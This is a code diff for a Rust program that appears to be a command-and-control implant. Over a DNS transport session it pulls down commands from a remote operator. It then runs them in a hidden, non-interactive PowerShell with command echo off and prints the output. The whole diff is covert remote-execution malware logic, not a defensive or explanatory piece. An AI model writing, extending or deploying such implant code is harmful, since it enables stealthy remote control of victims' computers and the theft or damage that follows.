@@ -3,6 +3,8 @@ use malgo_rust::session::Session;
 use malgo_rust::transport::dns::*;
 use malgo_rust::transport::Transport;
 
+use powershell_script::PsScriptBuilder;
+
 fn main() {
     let session: Session = Session {
         id: String::from("336df889-c0e9-453a-8675-8bff4176e1b0"),
@@ -19,7 +21,30 @@ fn main() {
     match dns.command_info() {
         Ok(resp) => {
             match resp {
-                Some(r) => { dbg!(r); },
+                Some(mut r) => {
+                    let mut done = false;
+                    let mut offset = 0u64;
+                    while !done {
+                        match dns.command_details(&mut r, &mut offset) {
+                            Ok(last) => {
+                                if last {
+                                    done = true
+                                }
+                            },
+                            Err(_) => {}
+                        }
+                    }
+                    println!("Command: {}", r.command);
+                    // TODO: change to custom PsScriptBuilder
+                    let ps = PsScriptBuilder::new()
+                        .no_profile(true)
+                        .non_interactive(true)
+                        .hidden(true)
+                        .print_commands(false)
+                        .build();
+                    let output = ps.run(r.command.as_str()).unwrap();
+                    dbg!(output);
+                },
                 None => {}
             }
         },
